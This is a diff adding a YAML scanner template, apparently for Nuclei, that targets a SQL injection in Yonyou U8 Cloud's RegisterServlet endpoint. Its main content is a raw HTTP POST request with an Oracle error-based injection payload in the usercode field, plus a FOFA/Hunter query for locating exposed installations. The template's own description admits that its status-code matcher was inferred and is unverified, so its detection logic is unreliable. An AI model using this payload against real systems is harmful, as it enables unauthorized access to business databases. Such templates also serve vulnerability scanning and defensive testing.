@@ -1,0 +1,42 @@
+id: poc-fbc2b6adce4751a6652f
+info:
+  name: 用友U8CloudRegisterServletSQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fbc2b6adce4751a6652f7b31a8afd61a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fbc2b6adce4751a6652f7b31a8afd61a
+    fofa: + hunter`app.name="用友 U8 Cloud"`
+http:
+- raw:
+  - 'POST /servlet/RegisterServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 85
+
+    Accept: */*
+
+    Accept-Language: en
+
+    Content-Type: application/x-www-form-urlencoded
+
+    X-Forwarded-For: 127.0.0.1
+
+    Accept-Encoding: gzip
+
+
+    usercode=1'' AND 7947=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (7947=7947) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(120)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL)-- GAtD'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
